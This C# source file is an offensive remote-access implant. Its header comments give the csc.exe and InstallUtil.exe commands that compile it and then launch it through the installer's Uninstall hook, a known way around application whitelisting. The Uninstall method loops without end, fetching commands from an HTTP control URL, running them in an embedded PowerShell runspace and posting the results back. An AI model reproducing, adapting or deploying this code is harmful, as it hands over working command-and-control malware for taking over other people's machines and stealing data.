using System;
using System.IO;
using System.Text;
using System.Net;
using System.IO.Compression;
using System.Reflection;
using System.Collections.Generic;
using System.Configuration.Install;



//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

//C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\Program Files\Reference Assemblies\Microsoft\WindowsPowerShell\v1.0\System.Management.Automation.dll" /out:irhs.dll /target:library /platform:x86 Reverse_HTTP.cs
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U irhs.dll



[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
	//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
	public override void Uninstall(System.Collections.IDictionary savedState)
	{		
		WebClient w = new WebClient();
			
            while (true)
            {
				
				try{
				
				string r = w.DownloadString("http://127.0.0.1/rat");
				string results = Pshell.RunPSCommand(r);
				w.UploadString("http://127.0.0.1/rat",results);
				}
				catch (Exception e)
				{
					w.UploadString("http://127.0.0.1/rat",e.Message);
				}
				
            }
			
	}

}
	
public class Pshell
    {

        //Based on Jared Atkinson's And Justin Warner's Work
        public static string RunPSCommand(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        
    }
